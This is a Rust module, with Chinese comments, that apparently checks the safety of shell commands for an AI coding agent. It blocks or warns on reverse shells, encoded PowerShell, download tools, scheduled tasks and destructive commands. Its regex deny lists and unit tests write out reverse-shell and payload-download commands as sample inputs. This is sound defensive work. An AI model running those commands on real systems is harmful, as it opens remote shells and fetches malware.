//! # shell_security.rs — Shell 命令安全检查模块
//!
//! 参考 Claude Code 的 bashSecurity.ts + powershellSecurity.ts，实现跨平台安全检查。
//! 中等严格级别：拦截高危（反向 Shell / IEX / base64 / 编码命令 / COM / WMI），
//! 警告中危（长周期 / sleep / .NET 方法），放行低危。
//!
//! ## 关键导出
//! - `check_command_safety()`: 主入口，按平台自动分发安全检查
//! - `is_readonly_command()`: 只读命令检测（可跳过权限确认）
//! - `get_destructive_warning()`: 破坏性命令警告（仅用于权限确认显示）
//! - `SafetyResult`: 检查结果枚举（Safe / Warn / Block）
//!
//! ## 依赖
//! - External: `regex`
//!
//! ## 约束
//! - 所有正则通过 `OnceLock` 懒初始化，全局只编译一次
//! - Windows 使用 PowerShell cmdlet 白名单，Unix 使用 bash 命令白名单

use std::sync::OnceLock;
use regex::Regex;

/// 命令安全检查结果
#[derive(Debug, PartialEq)]
pub enum SafetyResult {
    /// 安全，允许执行
    Safe,
    /// 警告但允许执行（附带警告信息返回给 LLM）
    Warn(String),
    /// 硬拦截，拒绝执行
    Block(String),
}

// --- 懒初始化正则 ---

fn control_char_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]").unwrap())
}

fn reverse_shell_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(/dev/tcp|mkfifo|nc\s+-e|ncat\s+-e|socat\s+.*exec|bash\s+-i\s+>&|/dev/udp)").unwrap()
    })
}

fn base64_decode_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(base64\s+(-d|--decode)|xxd\s+-r|\[Convert\]::FromBase64String|FromBase64String|\[System\.Convert\]::FromBase64)").unwrap()
    })
}

fn dangerous_ps_cmdlet_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(Invoke-Expression|iex\s|Invoke-WebRequest|iwr\s|wget\s|curl\s|Start-Process|New-Object\s+Net\.WebClient|DownloadString|DownloadFile|DownloadData)").unwrap()
    })
}

fn long_running_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(npm\s+run\s+dev|npm\s+start|yarn\s+dev|yarn\s+start|pnpm\s+dev|pnpm\s+start|vite\b|vue-cli-service\s+serve|python\s+manage\.py\s+runserver|flask\s+run|uvicorn\s|npx\s+serve|http-server)").unwrap()
    })
}

fn sleep_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(^|\s|;)(sleep\s+\d|Start-Sleep\s|timeout\s+/t\s)").unwrap()
    })
}

fn dangerous_variable_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(\$RANDOM|\$PPID|\$LINENO|\$HOSTNAME|\$BASH_ENV|\$CDPATH|\$IFS)").unwrap()
    })
}

fn node_modules_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(dir\s+node_modules|ls\s+node_modules|Get-ChildItem\s+.*node_modules)").unwrap()
    })
}

fn obfuscated_flag_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // ANSI-C quoting: $'...'
        // Empty quotes before dash: ''-cmd, ""-cmd
        // 3+ consecutive quotes at word start
        Regex::new(r#"(?i)(\$'[^']*'|''\s*-|""\s*-|'{3,}\w|"{3,}\w)"#).unwrap()
    })
}

fn command_substitution_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\$\(").unwrap()
    })
}

// --- 新增：PowerShell 深度安全检查正则（参考 powershellSecurity.ts） ---

fn encoded_command_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // -EncodedCommand / -enc / -e 作为 PowerShell/pwsh 的参数
        Regex::new(r"(?i)(powershell|pwsh)\s+.*-(EncodedCommand|enc|e)\s").unwrap()
    })
}

fn download_utility_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // certutil -urlcache, bitsadmin /transfer, Start-BitsTransfer
        Regex::new(r"(?i)(certutil\s+.*-urlcache|bitsadmin\s+/transfer|Start-BitsTransfer)").unwrap()
    })
}

fn com_object_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)New-Object\s+.*-ComObject").unwrap()
    })
}

fn scheduled_task_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(Register-ScheduledTask|schtasks\s+/create)").unwrap()
    })
}

fn runas_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // Start-Process -Verb RunAs (privilege escalation)
        Regex::new(r"(?i)Start-Process\s+.*-Verb\s+RunAs").unwrap()
    })
}

fn wmi_invoke_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(Invoke-WmiMethod|Invoke-CimMethod)").unwrap()
    })
}

fn unc_path_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // UNC path: \\server\share
        Regex::new(r#"\\\\[a-zA-Z0-9._-]+\\[a-zA-Z0-9._$-]+"#).unwrap()
    })
}

fn module_loading_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(Import-Module|Install-Module|Update-Module)").unwrap()
    })
}

fn dotnet_method_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // [TypeName]::Method() pattern - .NET static method calls
        Regex::new(r"\[[\w.]+\]::\w+\s*\(").unwrap()
    })
}

fn alias_manipulation_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(Set-Alias|New-Alias)\s").unwrap()
    })
}

fn new_object_typename_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)New-Object\s+.*-TypeName").unwrap()
    })
}

// --- 破坏性命令警告正则 ---

fn destructive_remove_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        // Remove-Item -Recurse, rm -rf, rd /s, rmdir /s
        Regex::new(r"(?i)(Remove-Item\s+.*-Recurse|rm\s+.*-rf|rd\s+/s|rmdir\s+/s)").unwrap()
    })
}

fn destructive_git_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(git\s+reset\s+--hard|git\s+push\s+.*--force|git\s+clean\s+-f|git\s+stash\s+(drop|clear))").unwrap()
    })
}

fn destructive_sql_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(DROP\s+(TABLE|DATABASE|SCHEMA)|TRUNCATE\s+TABLE)").unwrap()
    })
}

fn destructive_system_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(Stop-Computer|Restart-Computer|Clear-RecycleBin|Format-Volume|Clear-Disk)").unwrap()
    })
}

fn destructive_clear_content_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)Clear-Content\s+.*\*").unwrap()
    })
}

// --- 只读命令白名单正则 ---

/// 只读 PowerShell cmdlet（不修改文件/系统状态）
const READONLY_CMDLETS: &[&str] = &[
    // 文件系统读取
    "get-childitem", "get-content", "get-item", "test-path", "resolve-path",
    "get-filehash", "get-acl", "get-authenticodesignature",
    // 文本搜索
    "select-string",
    // 对象检查
    "get-member", "compare-object", "measure-object", "join-string", "get-random",
    // 路径工具
    "convert-path", "join-path", "split-path",
    // 系统信息
    "get-process", "get-service", "get-computerinfo", "get-host", "get-date",
    "get-location", "get-psdrive", "get-module", "get-alias", "get-history",
    "get-culture", "get-timezone", "get-uptime", "get-clipboard",
    // 输出格式
    "write-output", "write-host", "format-table", "format-list", "format-wide",
    "format-custom", "select-object", "sort-object", "group-object", "where-object",
    "out-string", "out-host", "tee-object",
    // 网络信息
    "get-netadapter", "get-netipaddress", "get-netipconfiguration",
    "get-netroute", "get-dnsclientcache", "get-dnsclient",
    // 事件日志
    "get-eventlog", "get-winevent",
    // 数据转换（只读）
    "convertto-json", "convertfrom-json", "convertto-csv", "convertfrom-csv",
    "convertto-html", "convertto-xml",
    // 导航（不修改文件）
    "set-location", "push-location", "pop-location",
];

/// 只读外部命令的子命令
const READONLY_GIT_ARGS: &[&str] = &[
    "status", "diff", "log", "show", "branch", "tag", "remote",
    "describe", "rev-parse", "name-rev", "ls-files", "ls-tree",
    "cat-file", "count-objects", "shortlog", "blame", "whatchanged",
];

const READONLY_GH_ARGS: &[&str] = &[
    "auth", "browse", "codespace", "config", "gpg-key", "label",
    "release", "repo", "secret", "ssh-key", "status",
];

/// gh 的二级子命令中只读的 action
const READONLY_GH_PR_ISSUE_ACTIONS: &[&str] = &[
    "list", "view", "diff", "checks", "ready", "reopen", "status",
];

const READONLY_DOCKER_ARGS: &[&str] = &[
    "ps", "images", "logs", "inspect", "stats", "top", "port", "diff",
];

/// Windows 只读命令
const READONLY_WIN_COMMANDS: &[&str] = &[
    "ipconfig", "netstat", "systeminfo", "tasklist", "where.exe", "where",
    "hostname", "whoami", "ver", "arp", "route", "getmac", "file", "tree",
    "findstr", "find", "fc", "comp", "type", "more", "cls", "echo", "set",
    "dir", "cd", "vol", "label", "chkdsk", "driverquery", "schtasks",
    "tasklist", "reg query",
];

// --- 检查函数实现 ---

fn check_control_chars(cmd: &str) -> Option<SafetyResult> {
    if control_char_re().is_match(cmd) {
        Some(SafetyResult::Block("命令包含不可见控制字符，可能是注入攻击。".to_string()))
    } else {
        None
    }
}

fn check_reverse_shell(cmd: &str) -> Option<SafetyResult> {
    if reverse_shell_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到反向 Shell 模式（/dev/tcp, mkfifo, nc -e 等），禁止执行。".to_string()))
    } else {
        None
    }
}

fn check_encoding(cmd: &str) -> Option<SafetyResult> {
    if base64_decode_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 base64 解码或编码混淆操作，可能隐藏恶意命令。如需解码，请告知用户手动操作。".to_string()))
    } else {
        None
    }
}

fn check_dangerous_cmdlet(cmd: &str) -> Option<SafetyResult> {
    if dangerous_ps_cmdlet_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到危险 PowerShell 命令（Invoke-Expression/Invoke-WebRequest/Start-Process/Net.WebClient 等），禁止执行。".to_string()))
    } else {
        None
    }
}

fn check_dangerous_variables(cmd: &str) -> Option<SafetyResult> {
    if dangerous_variable_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到危险变量注入（$RANDOM/$PPID/$IFS 等），禁止执行。".to_string()))
    } else {
        None
    }
}

fn check_obfuscated_flags(cmd: &str) -> Option<SafetyResult> {
    if obfuscated_flag_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到混淆标志（ANSI-C 引用或空引号拼接），可能是绕过安全检查的尝试。".to_string()))
    } else {
        None
    }
}

/// 检查 PowerShell 编码命令（绕过所有安全检查的最危险方式之一）
fn check_encoded_command(cmd: &str) -> Option<SafetyResult> {
    if encoded_command_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 PowerShell -EncodedCommand 参数，这是绕过安全检查的常见手段，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查 Windows 内置下载工具
fn check_download_utilities(cmd: &str) -> Option<SafetyResult> {
    if download_utility_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 Windows 内置下载工具（certutil/bitsadmin/Start-BitsTransfer），可能用于下载恶意载荷，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查 COM 对象创建
fn check_com_object(cmd: &str) -> Option<SafetyResult> {
    if com_object_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 New-Object -ComObject，COM 对象可执行任意系统操作，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查计划任务创建
fn check_scheduled_task(cmd: &str) -> Option<SafetyResult> {
    if scheduled_task_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到计划任务创建（Register-ScheduledTask/schtasks），可能用于持久化攻击，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查提权操作
fn check_runas(cmd: &str) -> Option<SafetyResult> {
    if runas_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 Start-Process -Verb RunAs 提权操作，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查 WMI 远程执行
fn check_wmi_invoke(cmd: &str) -> Option<SafetyResult> {
    if wmi_invoke_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 Invoke-WmiMethod/Invoke-CimMethod，WMI 可用于远程执行，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查 UNC 路径（网络路径访问）
fn check_unc_path(cmd: &str) -> Option<SafetyResult> {
    if unc_path_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 UNC 网络路径（\\\\server\\share），禁止访问网络资源。".to_string()))
    } else {
        None
    }
}

// --- Warn 类检查 ---

fn check_long_running(cmd: &str) -> Option<SafetyResult> {
    if long_running_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到长周期命令（开发服务器等）。建议使用 `run_in_background: true` 以避免阻塞对话。".to_string()))
    } else {
        None
    }
}

fn check_sleep(cmd: &str) -> Option<SafetyResult> {
    if sleep_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到 sleep 命令。请确认是否必要——大多数场景应避免 sleep，改用事件驱动或轮询。".to_string()))
    } else {
        None
    }
}

fn check_node_modules(cmd: &str) -> Option<SafetyResult> {
    if node_modules_re().is_match(cmd) {
        Some(SafetyResult::Warn("禁止使用 shell 浏览 node_modules 目录（会产生数千行无用输出）。请使用 list_directory 工具或直接假设依赖已安装。".to_string()))
    } else {
        None
    }
}

fn check_command_substitution(cmd: &str) -> Option<SafetyResult> {
    if command_substitution_re().is_match(cmd) {
        Some(SafetyResult::Warn("命令包含 $() 子表达式。请确认子命令安全。".to_string()))
    } else {
        None
    }
}

/// 检查模块加载/安装
fn check_module_loading(cmd: &str) -> Option<SafetyResult> {
    if module_loading_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到 PowerShell 模块操作（Import-Module/Install-Module）。请确认模块来源可信。".to_string()))
    } else {
        None
    }
}

/// 检查 .NET 静态方法调用
fn check_dotnet_method(cmd: &str) -> Option<SafetyResult> {
    if dotnet_method_re().is_match(cmd) {
        Some(SafetyResult::Warn("命令包含 .NET 静态方法调用 [Type]::Method()。请确认调用安全。".to_string()))
    } else {
        None
    }
}

/// 检查别名操作
fn check_alias_manipulation(cmd: &str) -> Option<SafetyResult> {
    if alias_manipulation_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到别名操作（Set-Alias/New-Alias），修改别名可能劫持后续命令。".to_string()))
    } else {
        None
    }
}

/// 检查 New-Object -TypeName（非 COM）
fn check_new_object_typename(cmd: &str) -> Option<SafetyResult> {
    if new_object_typename_re().is_match(cmd) && !com_object_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到 New-Object -TypeName，创建 .NET 对象。请确认类型安全。".to_string()))
    } else {
        None
    }
}

// --- 只读命令检测 ---

/// 提取命令的第一个 token（cmdlet/命令名），处理管道和分号
fn extract_command_name(cmd: &str) -> String {
    let trimmed = cmd.trim();
    // 取第一个非空 token
    trimmed.split_whitespace()
        .next()
        .unwrap_or("")
        .trim_matches('"')
        .trim_matches('\'')
        .to_lowercase()
}

/// 检查命令是否为只读操作（可跳过危险命令权限确认）
///
/// 安全约束：
/// - 包含 $()、@、赋值 =、重定向 > 的命令不算只读
/// - 管道中如果包含写操作 cmdlet 则不算只读
fn is_readonly_command_windows(cmd: &str) -> bool {
    // 安全约束：包含危险模式的不算只读
    if command_substitution_re().is_match(cmd) {
        return false;
    }
    // 赋值操作
    if Regex::new(r"(?i)\$\w+\s*=").unwrap().is_match(cmd) {
        return false;
    }
    // 输出重定向到文件（> 但不是 > $null 和 > NUL 和 > /dev/null）
    if cmd.contains('>') {
        // 提取 > 后面的内容，检查是否为安全的空重定向
        if let Some(gt_pos) = cmd.find('>') {
            let after = cmd[gt_pos + 1..].trim_start();
            let after_lower = after.to_lowercase();
            if !after_lower.starts_with("$null")
                && !after_lower.starts_with("nul")
                && !after_lower.starts_with("/dev/null")
                && !after_lower.starts_with("&")
            {
                return false;
            }
        }
    }
    // Splatting
    if Regex::new(r"@\w+").unwrap().is_match(cmd) {
        return false;
    }

    // 分割管道，检查每一段
    for segment in cmd.split('|') {
        let segment = segment.trim();
        if segment.is_empty() {
            continue;
        }

        let name = extract_command_name(segment);
        if name.is_empty() {
            continue;
        }

        // 检查是否为只读 PowerShell cmdlet
        if READONLY_CMDLETS.iter().any(|c| *c == name) {
            continue;
        }

        // 检查只读外部命令
        if name == "git" {
            // git 命令检查子命令是否只读
            let git_sub = segment.split_whitespace().nth(1).unwrap_or("").to_lowercase();
            if !READONLY_GIT_ARGS.iter().any(|a| *a == git_sub) {
                return false;
            }
            continue;
        }

        if name == "gh" {
            let gh_sub = segment.split_whitespace().nth(1).unwrap_or("").to_lowercase();
            // gh pr/issue 需要检查第三级子命令
            if gh_sub == "pr" || gh_sub == "issue" {
                let gh_action = segment.split_whitespace().nth(2).unwrap_or("").to_lowercase();
                if !READONLY_GH_PR_ISSUE_ACTIONS.iter().any(|a| *a == gh_action) {
                    return false;
                }
            } else if !READONLY_GH_ARGS.iter().any(|a| *a == gh_sub) {
                return false;
            }
            continue;
        }

        if name == "docker" {
            let docker_sub = segment.split_whitespace().nth(1).unwrap_or("").to_lowercase();
            if !READONLY_DOCKER_ARGS.iter().any(|a| *a == docker_sub) {
                return false;
            }
            continue;
        }

        // 检查 Windows 只读命令
        if READONLY_WIN_COMMANDS.iter().any(|c| *c == name || name.starts_with(c)) {
            continue;
        }

        // 未知命令 → 不是只读
        return false;
    }

    true
}

// --- 破坏性命令警告 ---

/// 检测破坏性命令，返回警告信息（仅用于权限确认显示，不拦截）
pub fn get_destructive_warning(cmd: &str) -> Option<String> {
    let mut warnings = Vec::new();

    if destructive_remove_re().is_match(cmd) {
        warnings.push("⚠ 检测到递归删除操作（Remove-Item -Recurse / rm -rf）");
    }
    if destructive_git_re().is_match(cmd) {
        warnings.push("⚠ 检测到 Git 破坏性操作（reset --hard / push --force / clean -f / stash drop）");
    }
    if destructive_sql_re().is_match(cmd) {
        warnings.push("⚠ 检测到 SQL 破坏性操作（DROP TABLE / TRUNCATE）");
    }
    if destructive_system_re().is_match(cmd) {
        warnings.push("⚠ 检测到系统级破坏性操作（Stop-Computer / Format-Volume / Clear-RecycleBin）");
    }
    if destructive_clear_content_re().is_match(cmd) {
        warnings.push("⚠ 检测到 Clear-Content 配合通配符（可能清空多个文件内容）");
    }

    if warnings.is_empty() {
        None
    } else {
        Some(warnings.join("\n"))
    }
}

// --- Unix/bash 特定安全检查（参考 bashSecurity.ts） ---

fn eval_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)(^|\s|;)(eval\s|source\s)").unwrap())
}

fn sudo_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"(?i)(^|\s)sudo\s").unwrap())
}

fn package_install_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"(?i)(apt\s+install|apt-get\s+install|yum\s+install|dnf\s+install|brew\s+install|pacman\s+-S\s|pip\s+install|npm\s+install\s+-g)").unwrap()
    })
}

/// 检查 eval/source（Unix 特定高危）
fn check_eval(cmd: &str) -> Option<SafetyResult> {
    if eval_re().is_match(cmd) {
        Some(SafetyResult::Block("检测到 eval/source 命令，可能执行任意代码，禁止执行。".to_string()))
    } else {
        None
    }
}

/// 检查 sudo（Unix 特定）
fn check_sudo(cmd: &str) -> Option<SafetyResult> {
    if sudo_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到 sudo 命令。请确认是否需要管理员权限。".to_string()))
    } else {
        None
    }
}

/// 检查包管理器安装（Unix 特定）
fn check_package_install(cmd: &str) -> Option<SafetyResult> {
    if package_install_re().is_match(cmd) {
        Some(SafetyResult::Warn("检测到包管理器安装命令。请确认安装来源可信。".to_string()))
    } else {
        None
    }
}

/// Unix/bash 安全检查（参考 bashSecurity.ts）
fn check_command_safety_unix(cmd: &str) -> SafetyResult {
    let trimmed = cmd.trim();

    if trimmed.is_empty() {
        return SafetyResult::Block("命令为空。".to_string());
    }

    // Block 类（Unix 特定 + 通用）
    let block_checks: &[fn(&str) -> Option<SafetyResult>] = &[
        check_control_chars,
        check_reverse_shell,
        check_encoding,
        check_eval,                  // Unix 特定：eval/source
        check_unc_path,              // 通用
        check_dangerous_variables,
        check_obfuscated_flags,
    ];

    for check in block_checks {
        if let Some(result) = check(trimmed) {
            return result;
        }
    }

    // Warn 类（Unix 特定 + 通用）
    let warn_checks: &[fn(&str) -> Option<SafetyResult>] = &[
        check_long_running,
        check_sleep,
        check_node_modules,
        check_command_substitution,
        check_sudo,                  // Unix 特定
        check_package_install,       // Unix 特定
    ];

    let mut warnings = Vec::new();
    for check in warn_checks {
        if let Some(SafetyResult::Warn(msg)) = check(trimmed) {
            warnings.push(msg);
        }
    }

    if !warnings.is_empty() {
        SafetyResult::Warn(warnings.join("\n"))
    } else {
        SafetyResult::Safe
    }
}

/// Windows/PowerShell 安全检查
fn check_command_safety_windows(cmd: &str) -> SafetyResult {
    let trimmed = cmd.trim();

    if trimmed.is_empty() {
        return SafetyResult::Block("命令为空。".to_string());
    }

    // Block 类（Windows 特定 + 通用）
    let block_checks: &[fn(&str) -> Option<SafetyResult>] = &[
        check_control_chars,
        check_reverse_shell,
        check_encoding,
        check_encoded_command,
        check_download_utilities,
        check_com_object,
        check_scheduled_task,
        check_runas,
        check_wmi_invoke,
        check_unc_path,
        check_dangerous_cmdlet,
        check_dangerous_variables,
        check_obfuscated_flags,
    ];

    for check in block_checks {
        if let Some(result) = check(trimmed) {
            return result;
        }
    }

    // Warn 类（Windows 特定 + 通用）
    let warn_checks: &[fn(&str) -> Option<SafetyResult>] = &[
        check_long_running,
        check_sleep,
        check_node_modules,
        check_command_substitution,
        check_module_loading,
        check_dotnet_method,
        check_alias_manipulation,
        check_new_object_typename,
    ];

    let mut warnings = Vec::new();
    for check in warn_checks {
        if let Some(SafetyResult::Warn(msg)) = check(trimmed) {
            warnings.push(msg);
        }
    }

    if !warnings.is_empty() {
        SafetyResult::Warn(warnings.join("\n"))
    } else {
        SafetyResult::Safe
    }
}

// --- Unix/bash 只读命令白名单 ---

const READONLY_UNIX_COMMANDS: &[&str] = &[
    // 文件系统读取
    "ls", "cat", "head", "tail", "less", "more", "file", "stat", "wc",
    "realpath", "readlink", "basename", "dirname",
    // 文本处理（只读）
    "grep", "egrep", "fgrep", "rg", "awk", "sed", "cut", "sort", "uniq",
    "tr", "tee", "xargs",
    // 系统信息
    "echo", "printf", "pwd", "env", "printenv", "which", "whereis",
    "whoami", "id", "uname", "date", "cal", "uptime",
    "df", "du", "free", "ps", "top", "htop", "lsof", "fuser",
    "hostname", "arch", "nproc",
    // 网络信息（只读）
    "ifconfig", "ip", "ss", "netstat", "ping", "traceroute", "dig", "nslookup",
    "host", "curl", "wget",
    // 版本控制（只读）
    "git", "gh",
    // 其他只读
    "tree", "find", "locate", "man", "info", "help",
    "diff", "cmp", "md5sum", "sha256sum",
    "tar", "gzip", "gunzip", "zip", "unzip",
];

/// Unix 只读命令检测
fn is_readonly_command_unix(cmd: &str) -> bool {
    // 安全约束
    if command_substitution_re().is_match(cmd) { return false; }
    if Regex::new(r"\$\w+\s*=").unwrap().is_match(cmd) { return false; }
    // 重定向到文件（> 但不是 > /dev/null 和 > &2）
    if cmd.contains('>') {
        if let Some(gt_pos) = cmd.find('>') {
            let after = cmd[gt_pos + 1..].trim_start();
            if !after.starts_with("/dev/null") && !after.starts_with("&") {
                return false;
            }
        }
    }
    if Regex::new(r"@\w+").unwrap().is_match(cmd) { return false; }

    for segment in cmd.split('|') {
        let segment = segment.trim();
        if segment.is_empty() { continue; }

        let name = extract_command_name(segment);
        if name.is_empty() { continue; }

        // git 子命令检查
        if name == "git" {
            let git_sub = segment.split_whitespace().nth(1).unwrap_or("").to_lowercase();
            if !READONLY_GIT_ARGS.iter().any(|a| *a == git_sub) {
                return false;
            }
            continue;
        }

        // gh 子命令检查
        if name == "gh" {
            let gh_sub = segment.split_whitespace().nth(1).unwrap_or("").to_lowercase();
            if gh_sub == "pr" || gh_sub == "issue" {
                let gh_action = segment.split_whitespace().nth(2).unwrap_or("").to_lowercase();
                if !READONLY_GH_PR_ISSUE_ACTIONS.iter().any(|a| *a == gh_action) {
                    return false;
                }
            } else if !READONLY_GH_ARGS.iter().any(|a| *a == gh_sub) {
                return false;
            }
            continue;
        }

        if READONLY_UNIX_COMMANDS.iter().any(|c| *c == name) {
            continue;
        }

        return false;
    }
    true
}

// --- 主入口 ---

/// 主入口：对命令进行安全检查（中等严格级别，按平台自动分发）
///
/// 检查顺序：Block 类先检查（高危），Warn 类后检查（中危）。
/// 返回第一个匹配的 Block 或所有 Warn 的合并。
pub fn check_command_safety(cmd: &str) -> SafetyResult {
    if cfg!(target_os = "windows") {
        check_command_safety_windows(cmd)
    } else {
        check_command_safety_unix(cmd)
    }
}

/// 只读命令检测（按平台自动分发）
pub fn is_readonly_command(cmd: &str) -> bool {
    if cfg!(target_os = "windows") {
        is_readonly_command_windows(cmd)
    } else {
        is_readonly_command_unix(cmd)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // --- 基础检查 ---

    #[test]
    fn test_empty_command() {
        assert_eq!(check_command_safety(""), SafetyResult::Block("命令为空。".to_string()));
        assert_eq!(check_command_safety("   "), SafetyResult::Block("命令为空。".to_string()));
    }

    #[test]
    fn test_safe_commands() {
        assert_eq!(check_command_safety("dir"), SafetyResult::Safe);
        assert_eq!(check_command_safety("Get-ChildItem"), SafetyResult::Safe);
        assert_eq!(check_command_safety("echo hello"), SafetyResult::Safe);
        assert_eq!(check_command_safety("git status"), SafetyResult::Safe);
        assert_eq!(check_command_safety("cargo check"), SafetyResult::Safe);
        assert_eq!(check_command_safety("npm install"), SafetyResult::Safe);
    }

    #[test]
    fn test_reverse_shell_blocked() {
        assert!(matches!(check_command_safety("bash -i >& /dev/tcp/1.2.3.4/80"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("mkfifo /tmp/f"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("nc -e /bin/sh 1.2.3.4 80"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_base64_blocked() {
        assert!(matches!(check_command_safety("echo 'aGVsbG8=' | base64 -d"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("[Convert]::FromBase64String('aGVsbG8=')"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_iex_blocked() {
        assert!(matches!(check_command_safety("Invoke-Expression 'Get-Process'"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("iex 'Get-Process'"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_web_request_blocked() {
        assert!(matches!(check_command_safety("Invoke-WebRequest http://example.com"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("wget http://example.com"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("curl http://example.com"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_start_process_blocked() {
        assert!(matches!(check_command_safety("Start-Process notepad"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_net_webclient_blocked() {
        assert!(matches!(check_command_safety("(New-Object Net.WebClient).DownloadString('http://x')"), SafetyResult::Block(_)));
    }

    // --- 新增：PowerShell 深度安全检查 ---

    #[test]
    fn test_encoded_command_blocked() {
        assert!(matches!(check_command_safety("powershell -EncodedCommand SGVsbG8="), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("pwsh -enc SGVsbG8="), SafetyResult::Block(_)));
    }

    #[test]
    fn test_download_utilities_blocked() {
        assert!(matches!(check_command_safety("certutil -urlcache -split -f http://x/payload.exe"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("bitsadmin /transfer job http://x/payload.exe C:\\temp\\p.exe"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("Start-BitsTransfer -Source http://x/file -Destination C:\\temp"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_com_object_blocked() {
        assert!(matches!(check_command_safety("New-Object -ComObject WScript.Shell"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("New-Object -ComObject Shell.Application"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_scheduled_task_blocked() {
        assert!(matches!(check_command_safety("Register-ScheduledTask -TaskName 'Updater' -Action (New-ScheduledTaskAction -Execute 'cmd.exe')"), SafetyResult::Block(_)));
        assert!(matches!(check_command_safety("schtasks /create /tn 'Updater' /tr 'cmd.exe' /sc daily"), SafetyResult::Block(_)));
    }

    #[test]
    fn test_runas_blocked() {
